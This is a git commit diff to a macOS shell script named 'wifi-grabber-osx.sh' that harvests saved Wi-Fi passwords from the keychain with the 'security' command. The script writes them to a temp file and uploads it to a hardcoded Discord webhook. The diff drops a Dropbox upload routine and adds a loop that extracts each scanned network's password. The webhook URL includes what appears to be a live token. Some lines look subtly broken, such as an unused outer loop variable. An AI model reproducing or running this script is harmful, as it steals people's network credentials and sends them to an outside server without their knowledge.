76110b78fde05693bf141c2fe9230b06fe38f1ba
Alex Planmarks <125360150+planmarks@users.noreply.github.com>
2023-05-01 18:02:08 +0300

    Update wifi-grabber-osx.sh

--- wifi-grabber-osx.sh
+++ wifi-grabber-osx.sh
@@ -2,21 +2,7 @@
 
 # Variables
 dc="https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
-db="<YOUR_DROPBOX_ACCESS_TOKEN>"
 temp_file="/tmp/wifi-pass.txt"
-
-# Function to upload files to Dropbox
-function dropbox_upload() {
-  local source_file_path=$1
-  local target_file_name=$(basename "$source_file_path")
-  local target_file_path="/$target_file_name"
-
-  curl -s -X POST https://content.dropboxapi.com/2/files/upload \
-    --header "Authorization: Bearer $db" \
-    --header "Content-Type: application/octet-stream" \
-    --header "Dropbox-API-Arg: {\"path\": \"$target_file_path\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}" \
-    --data-binary @"$source_file_path"
-}
 
 # Function to upload files to Discord
 function discord_upload() {
@@ -29,22 +15,22 @@ function discord_upload() {
 
 # Retrieve Wi-Fi passwords
 echo "Script started"
-echo "Gathering Wi-Fi profiles..."
-security find-generic-password -wa > "$temp_file"
-
-# Upload to Dropbox
-if [[ -n "$db" ]]; then
-  echo "Uploading to Dropbox..."
-  dropbox_upload "$temp_file"
-  echo "Upload to Dropbox completed"
-fi
+echo "Gathering Wi-Fi profiles..." > "$temp_file"
+IFS=$'\n'
+for ssid in $(networksetup -listallhardwareports | grep -A 1 "Wi-Fi" | grep -oP '(?<=Device: ).*'); do
+  for network in $(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s -x | grep -oP '(?<=<string>).*?(?=</string>)'); do
+    security find-generic-password -D "AirPort network password" -a $network -w &> /dev/null
+    if [ $? -eq 0 ]; then
+      echo "SSID: $network" >> "$temp_file"
+      echo "Password: $(security find-generic-password -D 'AirPort network password' -a $network -w)" >> "$temp_file"
+    fi
+  done
+done
 
 # Upload to Discord
-if [[ -n "$dc" ]]; then
-  echo "Uploading to Discord..."
-  discord_upload "$temp_file"
-  echo "Upload to Discord completed"
-fi
+echo "Uploading to Discord..."
+discord_upload "$temp_file"
+echo "Upload to Discord completed"
 
 # Cleanup
 echo "Cleaning up..."
